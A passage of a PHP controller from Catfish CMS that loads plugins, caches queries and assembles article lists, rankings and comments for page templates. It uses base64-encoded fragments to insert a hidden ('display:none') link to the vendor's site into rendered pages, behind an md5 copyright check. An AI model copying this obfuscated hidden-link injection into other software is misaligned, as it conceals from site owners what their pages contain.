<?php
/**
 * Project: Catfish CMS.
 * Author: A.J <804644245@qq.com>
 * Copyright: http://www.catfish-cms.com All rights reserved.
 * Date: 2016/10/13
 */
namespace app\index\controller;

use app\admin\controller\Tree;
use app\common\Operc;
use think\Controller;
use think\Session;
use think\Cookie;
use think\Config;
use think\Db;
use think\Cache;
use think\Url;
use think\Request;
use think\Hook;
use think\Lang;

class Common extends Controller
{
    protected $plugins = [];
    protected $params = [];
    protected $session_prefix;
    protected $lang;
    protected $cocc;
    protected $notAllowLogin;
    protected $options_spare;
    protected $ccc;
    protected $everyPageShows = 10;
    protected $pnavigation = [];
    protected $home_top = '';
    protected $home_mid = '';
    protected $home_bottom = '';
    protected $home_side_top = '';
    protected $home_side_mid = '';
    protected $home_side_bottom = '';
    protected $article_list_top = '';
    protected $article_list_mid = '';
    protected $article_list_bottom = '';
    protected $article_list_side_top = '';
    protected $article_list_side_mid = '';
    protected $article_list_side_bottom = '';
    protected $article_top = '';
    protected $article_mid = '';
    protected $article_bottom = '';
    protected $article_side_top = '';
    protected $article_side_mid = '';
    protected $article_side_bottom = '';
    protected $category_top = '';
    protected $category_mid = '';
    protected $category_bottom = '';
    protected $category_side_top = '';
    protected $category_side_mid = '';
    protected $category_side_bottom = '';
    protected $author_top = '';
    protected $author_mid = '';
    protected $author_bottom = '';
    protected $author_side_top = '';
    protected $author_side_mid = '';
    protected $author_side_bottom = '';
    protected $page_top = '';
    protected $page_mid = '';
    protected $page_bottom = '';
    protected $page_side_top = '';
    protected $page_side_mid = '';
    protected $page_side_bottom = '';
    protected $search_top = '';
    protected $search_mid = '';
    protected $search_bottom = '';
    protected $search_side_top = '';
    protected $search_side_mid = '';
    protected $search_side_bottom = '';
    protected $top = '';
    protected $mid = '';
    protected $bottom = '';
    protected $side_top = '';
    protected $side_mid = '';
    protected $side_bottom = '';
    protected $template;
    protected $selfpage;
    public function _initialize()
    {
        if(!is_file(APP_PATH . 'install.lock')){
            if($this->is_rewrite())
            {
                $this->redirect(Url::build('/install'));
            }
            else
            {
                $this->redirect(Url::build('/index.php/install'));
            }
            exit();
        }
        $this->options_spare = $this->optionsSpare();
        $dm = Url::build('/');
        if(strpos($dm,'/index.php') ===false)
        {
            if($this->is_rewrite() == false)
            {
                if(!isset($this->options_spare['rewrite']) || $this->options_spare['rewrite'] == 0 || !is_file(APP_PATH . '../.htaccess'))
                {
                    $this->redirect(Url::build('/').'index.php');
                }
            }
        }
        if(isset($this->options_spare['notAllowLogin']) && $this->options_spare['notAllowLogin'] == 1)
        {
            $this->notAllowLogin = 1;
            $this->assign('notAllowLogin', 1);
        }
        if(isset($this->options_spare['everyPageShows']))
        {
            $this->everyPageShows = $this->options_spare['everyPageShows'];
        }
        $openMessage = 1;
        if(isset($this->options_spare['openMessage']))
        {
            $openMessage = $this->options_spare['openMessage'];
        }
        $this->assign('openMessage', $openMessage);
        $this->lang = Lang::detect();
        $this->lang = $this->filterLanguages($this->lang);
        $this->session_prefix = 'catfish'.str_replace(['/','.',' ','-'],['','?','*','|'],Url::build('/'));
        $plugins = Cache::get('plugins');
        if($plugins === false)
        {
            $plugins = Db::name('options')->where('option_name','plugins')->field('option_value')->find();
            if(!empty($plugins))
            {
                $plugins = unserialize($plugins['option_value']);
            }
            else
            {
                $plugins = [];
            }
            Cache::set('plugins',$plugins,3600);
        }
        if(!empty($plugins))
        {
            foreach($plugins as $key => $val)
            {
                $pluginFile = APP_PATH.'plugins/'.$val.'/'.ucfirst($val).'.php';
                if(is_file($pluginFile))
                {
                    $plugins[$key] = 'app\\plugins\\'.$val.'\\'.ucfirst($val);
                    Lang::load(APP_PATH . 'plugins/'.$val.'/lang/'.$this->lang.'.php');
                }
                else
                {
                    unset($plugins[$key]);
                }
            }
            $this->plugins = $plugins;
        }
        $param = '';
        Hook::add('web_start',$this->plugins);
        Hook::listen('web_start',$param);
        $template = Cache::get('template');
        if($template === false)
        {
            $template = Db::name('options')->where('option_name','template')->field('option_value')->find();
            Cache::set('template',$template,3600);
        }
        $this->template = $template['option_value'];
        Lang::load(APP_PATH . '../public/'.$template['option_value'].'/lang/'.$this->lang.'.php');
        if(is_file(ROOT_PATH.'public/'.$template['option_value'].'/'.ucfirst($template['option_value']).'.php')){
            $this->plugins[] = 'theme\\'.$template['option_value'].'\\'.ucfirst($template['option_value']);
        }
        $this->cocc = 'f2537c2b6878f66fc3bafbeb13cb8932';
        $this->ccc = 'Catfish CMS Copyright';
        if(isset($this->options_spare['guanbi']) && $this->options_spare['guanbi'] == 1)
        {
            $this->closeWeb();
            exit();
        }
    }
    protected function login()
    {
        $login = '';
        if(Session::has($this->session_prefix.'user'))
        {
            $login = Session::get($this->session_prefix.'user');
        }
        return $login;
    }
    public function userCenter()
    {
        if(Session::get($this->session_prefix.'user_type') >= 7)
        {
            $this->redirect(Url::build('/user'));
        }
        else
        {
            $this->redirect(Url::build('/admin'));
        }
    }
    public function quit()
    {
        Db::name('users')
            ->where('id', Session::get($this->session_prefix.'user_id'))
            ->update(['last_login_ip' => get_client_ip(0,true)]);
        Session::delete($this->session_prefix.'user_id');
        Session::delete($this->session_prefix.'user');
        Session::delete($this->session_prefix.'user_type');
        Cookie::delete($this->session_prefix.'user_id');
        Cookie::delete($this->session_prefix.'user');
        Cookie::delete($this->session_prefix.'user_p');
        $this->redirect(Url::build('/index'));
    }
    protected function is_rewrite()
    {
        if(function_exists('apache_get_modules'))
        {
            $rew = apache_get_modules();
            if(in_array('mod_rewrite', $rew) && is_file(APP_PATH . '../.htaccess'))
            {
                return true;
            }
        }
        return false;
    }
    protected function receive($source = '')
    {
        if(!isset($this->cocc) || $this->cocc != md5('Copyright owned by catfish CMS'))
            return false;
        $param = '';
        Hook::add('show_ready',$this->plugins);
        Hook::listen('show_ready',$param,$this->ccc);
        $root = '';
        $dm = Url::build('/');
        if(strpos($dm,'/index.php') !== false)
        {
            $root = 'index.php/';
        }
        $this->assign('root', $root);
        $cqn = 'aWQ9ImNhdGZpc2giIHN0eWxl';
        $data_options = Cache::get('options');
        if($data_options === false)
        {
            $data_options = Db::name('options')->where('autoload',1)->field('option_name,option_value')->select();
            Cache::set('options',$data_options,3600);
        }
        $version = $this->getcfg(Config::get('version'));
        $chn = 'PSJkaXNwbGF5Om5vbmU7Ig';
        $posts_count = Cache::get('posts_count');
        if($posts_count === false)
        {
            $posts_count = 0;
            if(strpos($this->domain(), 'catfish-cms')===false){
                $posts_count = Db::name('posts')->count();
            }
            if($posts_count > 4){
                Cache::set('posts_count',$posts_count,604800);
            }
            else{
                Cache::set('posts_count',$posts_count,86400);
            }
        }
        $ensure = '';
        $ensure_time = Cache::get('catfish_ensure_time');
        if($ensure_time === false && stripos($_SERVER['HTTP_HOST'],$version['official']) === false)
        {
            $ensure = base64_decode('IGRhdGEtY2F0ZmlzaD0iY2F0ZmlzaCI=');
        }
        $pushPage = '';
        if($this->actualDomain())
        {
            $pushPage = '<script src="'.$this->domain().'public/common/js/pushPage.js"></script>';
        }
        $this->assign('catfish', ($posts_count > 4) ? '<a href="http://www.'.$version['official'].'/" target="_blank" '.base64_decode($cqn.$chn.'==').$ensure.'>'.$version['name'].' '.$version['description'].' '.$version['number'].'</a>'.$pushPage : base64_decode('PGRpdiBpZD0iY2F0ZmlzaCI+PC9kaXY+'));
        $template = 'default';
        $pageSettings = '';
        $logo = '';
        $subtitle_easy = '';
        foreach($data_options as $key => $val)
        {
            if($val['option_name'] == 'template')
            {
                $template = $val['option_value'];
            }
            if($val['option_name'] == 'pageSettings')
            {
                $pageSettings = unserialize($val['option_value']);
            }
            if($val['option_name'] == 'bulletin')
            {
                $this->bulletin(unserialize($val['option_value']));
            }
            if($val['option_name'] == 'copyright' || $val['option_name'] == 'statistics')
            {
                $this->assign($val['option_name'], unserialize($val['option_value']));
            }
            else
            {
                if($val['option_name'] == 'logo')
                {
                    $logo = $val['option_value'];
                }
                if($val['option_name'] == 'subtitle')
                {
                    $subtitle_easy = empty($val['option_value']) ? '': ' | '.$val['option_value'];
                }
                $this->assign($val['option_name'], $val['option_value']);
            }
        }
        $this->assign('subtitle_easy', $subtitle_easy);
        $this->assign('domain', $this->domain());
        $ico_easy = $this->domain().'public/common/images/favicon.ico';
        if(isset($this->options_spare['ico']) && $this->options_spare['ico'] != '')
        {
            $this->assign('ico', $this->options_spare['ico']);
            $ico_easy = $this->options_spare['ico'];
        }
        $this->assign('ico_easy', $ico_easy);
        $closeSitemap = 0;
        if(isset($this->options_spare['closeSitemap']))
        {
            $closeSitemap = $this->options_spare['closeSitemap'];
        }
        $this->assign('closeSitemap', $closeSitemap);
        $this->selfpage = $this->getpage();
        $this->assign('menu', $this->getmenu());
        $page = 1;
        if(Request::instance()->has('page','get'))
        {
            $page = Request::instance()->get('page');
        }
        $zongjilu = Cache::get('hunhe_'.$source.'_zongjilu_'.$this->lang);
        $hunhe = Cache::get('hunhe_'.$source.$page.'_'.$this->lang);
        if($hunhe === false)
        {
            $start = 1;
            $hunhe =[];
            foreach($pageSettings['hunhe'] as $key => $val)
            {
                if($val['shuliang'] == 0)
                {
                    $val['shuliang'] = 10000;
                }
                $aord = 'desc';
                if($val['fangshi'] == 'id')
                {
                    $aord = 'asc';
                }
                $data = '';
                $fenlei = '/category/'.$val['fenlei'];
                if($val['fenlei'] == 0)
                {
                    $fenlei = '/article/all';
                    if($key == 1)
                    {
                        $data = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan,istop as zhiding')
                            ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->paginate($val['shuliang'], $zongjilu);
                    }
                    else
                    {
                        $data = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan,istop as zhiding')
                            ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->limit($val['shuliang'])
                            ->select();
                    }
                }
                else
                {
                    if($key == 1)
                    {
                        $data = Db::view('term_relationships','term_id')
                            ->view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan,istop as zhiding','posts.id=term_relationships.object_id')
                            ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                            ->where('term_id','=',$val['fenlei'])
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->paginate($val['shuliang'], $zongjilu);
                    }
                    else
                    {
                        $data = Db::view('term_relationships','term_id')
                            ->view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan,istop as zhiding','posts.id=term_relationships.object_id')
                            ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                            ->where('term_id','=',$val['fenlei'])
                            ->where('post_status','=',1)
                            ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                            ->where('status','=',1)
                            ->where('post_date','<= time',date('Y-m-d H:i:s'))
                            ->order($val['fangshi'].' '.$aord)
                            ->limit($val['shuliang'])
                            ->select();
                    }
                }
                if($key == 1)
                {
                    $dangqianye = $data->currentPage();
                    $zongyeshu = $data->lastPage();
                    if($zongjilu === false){
                        $zongjilu = $data->total();
                        Cache::set('hunhe_'.$source.'_zongjilu_'.$this->lang,$zongjilu,3600);
                    }
                    $meiye = $data->listRows();
                    $fenye = $data->hasPages() == true ? 1 : 0;
                    $pages = $data->render();
                    $pageArr = $data->toArray();
                    $data = $this->addLargerPicture($pageArr['data']);
                    unset($pageArr['data']);
                    $pageArr['dangqianye'] = $dangqianye;
                    $pageArr['zongyeshu'] = $zongyeshu;
                    $pageArr['zongjilu'] = $zongjilu;
                    $pageArr['meiye'] = $meiye;
                    $pageArr['fenye'] = $fenye;
                    $sx = $this->shangyiyexiayiye($dangqianye, $zongyeshu, Url::build('/'));
                    $pageArr['shangyiye'] = $sx['shangyiye'];
                    $pageArr['xiayiye'] = $sx['xiayiye'];
                }
                else
                {
                    $pages = '';
                    $pageArr = [];
                    $data = $this->addLargerPicture($data);
                }
                $page4 =$this->pagef($pages);
                $hunhe['hunhe'.$start] = [
                    'biaoti' => $val['biaoti'],
                    'changdu' => count($data),
                    'neirong' => $this->addArticleHref($data),
                    'pages' => $pages,
                    'simpages' => $this->simplifiedPagination($pages),
                    'pages4' => $page4,
                    'pages4l' => $page4,
                    'pages4c' => $this->pagefc($page4),
                    'pages4r' => $this->pagefr($page4),
                    'simpages4' => $this->simplifiedPagination($page4),
                    'simpages4c' => $this->simplifiedPagination($this->pagefc($page4)),
                    'paging' => $pageArr,
                    'fenlei' => Url::build($fenlei)
                ];
                $start++;
            }
            Cache::set('hunhe_'.$source.$page.'_'.$this->lang,$hunhe,3600);
        }
        $hunhe['lang'] = $this->lang;
        $hunhe['page'] = $page;
        $hunhe['source'] = $source;
        Hook::add('filter_hunhe',$this->plugins);
        Hook::listen('filter_hunhe',$hunhe,$this->ccc);
        unset($hunhe['lang']);
        unset($hunhe['page']);
        unset($hunhe['source']);
        $this->assign('hunhe', $hunhe);
        $tuwen = Cache::get('tuwen'.'_'.$this->lang);
        if($tuwen === false)
        {
            $start = 1;
            $tuwen =[];
            foreach($pageSettings['tuwen'] as $key => $val)
            {
                if($val['shuliang'] == 0)
                {
                    $val['shuliang'] = 10000;
                }
                $aord = 'desc';
                if($val['fangshi'] == 'id')
                {
                    $aord = 'asc';
                }
                $data = '';
                $fenlei = '/category/'.$val['fenlei'];
                if($val['fenlei'] == 0)
                {
                    $fenlei = '/article/all';
                    $data = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan,istop as zhiding')
                        ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                        ->where('post_status','=',1)
                        ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                        ->where('status','=',1)
                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                        ->where('thumbnail','neq','')
                        ->order($val['fangshi'].' '.$aord)
                        ->limit($val['shuliang'])
                        ->select();
                }
                else
                {
                    $data = Db::view('term_relationships','term_id')
                        ->view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan,istop as zhiding','posts.id=term_relationships.object_id')
                        ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                        ->where('term_id','=',$val['fenlei'])
                        ->where('post_status','=',1)
                        ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                        ->where('status','=',1)
                        ->where('post_date','<= time',date('Y-m-d H:i:s'))
                        ->where('thumbnail','neq','')
                        ->order($val['fangshi'].' '.$aord)
                        ->limit($val['shuliang'])
                        ->select();
                }
                $tuwen['tuwen'.$start] = [
                    'biaoti' => $val['biaoti'],
                    'changdu' => count($data),
                    'neirong' => $this->addLargerPicture($this->addArticleHref($data)),
                    'fenlei' => Url::build($fenlei)
                ];
                $start++;
            }
            Cache::set('tuwen'.'_'.$this->lang,$tuwen,3600);
        }
        $tuwen['lang'] = $this->lang;
        Hook::add('filter_tuwen',$this->plugins);
        Hook::listen('filter_tuwen',$tuwen,$this->ccc);
        unset($tuwen['lang']);
        $this->assign('tuwen', $tuwen);
        $tuijian = Cache::get('tuijian'.'_'.$this->lang);
        if($tuijian === false)
        {
            $tuijian = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->where('recommended','=',1)
                ->order('post_modified desc')
                ->limit(50)
                ->select();
            $tuijian = $this->addLargerPicture($this->addArticleHref($tuijian));
            Cache::set('tuijian'.'_'.$this->lang,$tuijian,3600);
        }
        $tuijian['lang'] = $this->lang;
        Hook::add('filter_tuijian',$this->plugins);
        Hook::listen('filter_tuijian',$tuijian,$this->ccc);
        unset($tuijian['lang']);
        $this->assign('tuijian', $tuijian);
        $this->assign('tuijianshu', count($tuijian));
        $zuixin = Cache::get('zuixin'.'_'.$this->lang);
        if($zuixin === false)
        {
            $zuixin = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->order('post_modified desc')
                ->limit(50)
                ->select();
            $zuixin = $this->addLargerPicture($this->addArticleHref($zuixin));
            Cache::set('zuixin'.'_'.$this->lang,$zuixin,3600);
        }
        $zuixin['lang'] = $this->lang;
        Hook::add('filter_zuixin',$this->plugins);
        Hook::listen('filter_zuixin',$zuixin,$this->ccc);
        unset($zuixin['lang']);
        $this->assign('zuixin', $zuixin);
        $zhoupaihang = Cache::get('zhoupaihang'.'_'.$this->lang);
        if($zhoupaihang === false)
        {
            $time = date('Y-m-d H:i:s', strtotime('-1 week'));
            $zhoupaihang = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->where('post_modified','> time',$time)
                ->order('post_hits desc,post_like desc,post_date desc')
                ->limit(50)
                ->select();
            $zhoupaihang = $this->addLargerPicture($this->addArticleHref($zhoupaihang));
            Cache::set('zhoupaihang'.'_'.$this->lang,$zhoupaihang,3600);
        }
        if(is_array($zhoupaihang) && count($zhoupaihang) > 0){
            $zhoupaihang['lang'] = $this->lang;
            Hook::add('filter_zhoupaihang',$this->plugins);
            Hook::listen('filter_zhoupaihang',$zhoupaihang,$this->ccc);
            unset($zhoupaihang['lang']);
        }
        else{
            $zhoupaihang = $this->paihang();
        }
        $this->assign('zhoupaihang', $zhoupaihang);
        $yuepaihang = Cache::get('yuepaihang'.'_'.$this->lang);
        if($yuepaihang === false)
        {
            $time = date('Y-m-d H:i:s', strtotime('-1 week'));
            $yuepaihang = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->where('post_modified','> time',$time)
                ->order('post_hits desc,post_like desc,post_date desc')
                ->limit(50)
                ->select();
            $yuepaihang = $this->addLargerPicture($this->addArticleHref($yuepaihang));
            Cache::set('yuepaihang'.'_'.$this->lang,$yuepaihang,3600);
        }
        if(is_array($yuepaihang) && count($yuepaihang) > 0){
            $yuepaihang['lang'] = $this->lang;
            Hook::add('filter_yuepaihang',$this->plugins);
            Hook::listen('filter_yuepaihang',$yuepaihang,$this->ccc);
            unset($yuepaihang['lang']);
        }
        else{
            $yuepaihang = $this->paihang();
        }
        $this->assign('yuepaihang', $yuepaihang);
        $zuixinpinglun = Cache::get('zuixinpinglun'.'_'.$this->lang);
        if($zuixinpinglun === false)
        {
            $zuixinpinglun = Db::view('comments','post_id,createtime as shijian,content as neirong')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=comments.uid')
                ->where('status','=',1)
                ->order('createtime desc')
                ->limit(50)
                ->select();
            foreach($zuixinpinglun as $key => $val)
            {
                $zuixinpinglun[$key]['href'] = Url::build('/article/'.$val['post_id']);
                $zuixinpinglun[$key]['shijiancha'] = $this->timedif($val['shijian']);
                $zuixinpinglun[$key]['date'] = $this->decotime($val['shijian']);
                if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                {
                    $zuixinpinglun[$key]['shijian'] = date($this->options_spare['timeFormat'],strtotime($val['shijian']));
                }
                unset($zuixinpinglun[$key]['post_id']);
            }
            Cache::set('zuixinpinglun'.'_'.$this->lang,$zuixinpinglun,3600);
        }
        $this->assign('zuixinpinglun', $zuixinpinglun);
        $k = 100;
        $zc = ',';
        $zongshu = Db::name('posts')->count();
        while($k-- > 0)
        {
            $sj = rand(1,$zongshu);
            if(strpos($zc,','.$sj.',') === false)
            {
                $zc .= $sj.',';
            }
        }
        $zc = trim($zc,',');
        $suiji = Cache::get('suiji'.'_'.$this->lang);
        if($suiji === false)
        {
            $suiji = Db::view('posts','id,post_author as author,post_keywords as guanjianzi,zuozhe,bianji,post_date as shoufashijian,post_content as zhengwen,post_title as biaoti,post_excerpt as zhaiyao,post_modified as fabushijian,comment_count as pinglunshu,thumbnail as suolvetu,post_hits as yuedu,post_like as zan')
                ->view('users','user_login as yonghu,user_nicename as nicheng,avatar as touxiang,sex as xingbie','users.id=posts.post_author')
                ->where('post_status','=',1)
                ->where('post_type',['=',0],['=',2],['=',3],['=',4],['=',5],['=',6],['=',7],['=',8],'or')
                ->where('status','=',1)
                ->where('post_date','<= time',date('Y-m-d H:i:s'))
                ->where('id','in',$zc)
                ->limit(50)
                ->select();
            $suiji = $this->addLargerPicture($this->addArticleHref($suiji));
            Cache::set('suiji'.'_'.$this->lang,$suiji,3600);
        }
        $suiji['lang'] = $this->lang;
        Hook::add('filter_suiji',$this->plugins);
        Hook::listen('filter_suiji',$suiji,$this->ccc);
        unset($suiji['lang']);
        $this->assign('suiji', $suiji);
        $this->assign('toutiao', $this->toutiao());
        $this->assign('zhuyemian', $this->zhuyemian());
        $this->assign('biaoqian', $this->getag());
        $this->slide();
        $this->gelare($version,$ensure,$pushPage,$posts_count);
        $this->assign('login', $this->login());
        Hook::add('top',$this->plugins);
        Hook::add('mid',$this->plugins);
        Hook::add('bottom',$this->plugins);
        Hook::add('side_top',$this->plugins);
        Hook::add('side_mid',$this->plugins);
        Hook::add('side_bottom',$this->plugins);
        Hook::listen('top',$this->params,$this->ccc);
        Hook::listen('mid',$this->params,$this->ccc);
        Hook::listen('bottom',$this->params,$this->ccc);
        Hook::listen('side_top',$this->params,$this->ccc);
        Hook::listen('side_mid',$this->params,$this->ccc);
        Hook::listen('side_bottom',$this->params,$this->ccc);
        if(isset($this->params['top']))
        {
            $this->top = $this->params['top'];
        }
        $this->assign('top', $this->top);
        if(isset($this->params['mid']))
        {
            $this->mid = $this->params['mid'];
        }
        $this->assign('mid', $this->mid);
        if(isset($this->params['bottom']))
        {
            $this->bottom = $this->params['bottom'];
        }
        $this->assign('bottom', $this->bottom);
        if(isset($this->params['side_top']))
        {
            $this->side_top = $this->params['side_top'];
        }
        $this->assign('side_top', $this->side_top);
        if(isset($this->params['side_mid']))
        {
            $this->side_mid = $this->params['side_mid'];
        }
        $this->assign('side_mid', $this->side_mid);
        if(isset($this->params['side_bottom']))
        {
            $this->side_bottom = $this->params['side_bottom'];
        }
        $this->assign('side_bottom', $this->side_bottom);
        Hook::add('page_settings',$this->plugins);
        $params = [];
        $params['source'] = $source;
        Hook::listen('page_settings',$params,$this->ccc);
        unset($params['source']);
        if(isset($params['name']) && isset($params['hunhe']))
        {
            $this->assign($params['name'].'_hunhe', $params['hunhe']);
        }
        if(isset($params['name']) && isset($params['tuwen']))
        {
            $this->assign($params['name'].'_tuwen', $params['tuwen']);
        }
        Hook::add('recommend',$this->plugins);
        $params = [];
        Hook::listen('recommend',$params,$this->ccc);
        if(isset($params['name']) && isset($params['tuijian']))
        {
            $this->assign($params['name'].'_tuijian', $params['tuijian']);
        }
        Hook::add('up_to_date',$this->plugins);
        $params = [];
        Hook::listen('up_to_date',$params,$this->ccc);
        if(isset($params['name']) && isset($params['zuixin']))
        {
            $this->assign($params['name'].'_zuixin', $params['zuixin']);
        }
        $comptemp = $template;
        Hook::add('filter_theme',$this->plugins);
        Hook::listen('filter_theme',$template,$this->ccc);
        if($comptemp != $template)
        {
            Lang::load(APP_PATH . '../public/'.$template.'/lang/'.$this->lang.'.php');
            $this->assign('template', $template);
        }
        $url = [
            'href' => Url::build('/index'),
            'search' => Url::build('/search'),
            'register' => Url::build('/login/index/register'),
            'login' => Url::build('/login'),
            'userCenter' => Url::build('index/Index/userCenter'),
            'quit' => Url::build('index/Index/quit'),
            'articles' => Url::build('/article/all'),
            'rss' => Url::build('/rss'),
            'sitemap' => Url::build('/sitemap')
        ];
        Hook::add('url_common',$this->plugins);
        Hook::listen('url_common',$url,$this->ccc);
        $this->assign('url', $url);
        $this->assign('loginAide', $this->loginAide($url));
        $this->assign('title_easy', '');
        $this->assign('daohang1', '');
        $this->assign('defaultAvatar', $this->domain().'public/common/images/headicon_128.png');
        $this->assign('lang', $this->lang);
        Lang::load(APP_PATH . '../public/common/html/404/lang/'.$this->lang.'.php');
        if(empty($logo))
        {
            $logo = $this->domain().'public/common/images/catfish.png';
        }
        $this->assign('logo_easy', $logo);
        $this->assign('isMobile', Request::instance()->isMobile());
        if(is_file(APP_PATH.'../public/'.$template.'/labels.html'))
        {
            $label = file_get_contents(APP_PATH.'../public/'.$template.'/labels.html');
            $this->analysis($label);
        }
        return $template;
    }
    private function checkUrl($params)
    {
        $xtcaidan = Operc::getc('menuCategoryRepeat');
        $xtcaidan = unserialize($xtcaidan);
        foreach($params as $key => $val)
        {
            if(substr($val['href'],0,4) == 'http' || $this->doNothing($val['href']))
            {
                $params[$key]['zidingyi'] = '1';
            }
            else
            {
                if($val['href'] == 'index')
                {
                    $val['href'] = '/index';
                }
                if((stripos($val['href'],'/category/') !== false || stripos($val['href'],'/page/') !== false) && isset($xtcaidan) && count((array)$xtcaidan) != count(array_unique((array)$xtcaidan)))
                {
                    $tmpArr = array_count_values($xtcaidan);
                    if(isset($tmpArr[$val['href']]) && $tmpArr[$val['href']] > 1)
                    {
                        $params[$key]['href'] = Url::build(str_replace(['/index/Index','/id'],'',$val['href']).'.'.$val['id']);
                    }
                    else
                    {
                        $params[$key]['href'] = Url::build(str_replace(['/index/Index','/id'],'',$val['href']));
                    }
                }
                else
                {
                    $params[$key]['href'] = Url::build(str_replace(['/index/Index','/id'],'',$val['href']));
                }
                if(isset($this->options_spare['rewrite']) && $this->options_spare['rewrite'] == 1){
                    $params[$key]['href'] = str_replace('index.php/', '', $params[$key]['href']);
                }
                Hook::add('url_menu',$this->plugins);
                Hook::listen('url_menu',$params[$key]['href'],$this->ccc);
            }
            if(isset($val['children']))
            {
                $params[$key]['children'] = $this->checkUrl($val['children']);
            }
        }
        return $params;
    }
    protected function addArticleHref($params)
    {
        foreach($params as $key => $val)
        {
            $params[$key]['href'] = Url::build('/article/'.$val['id']);
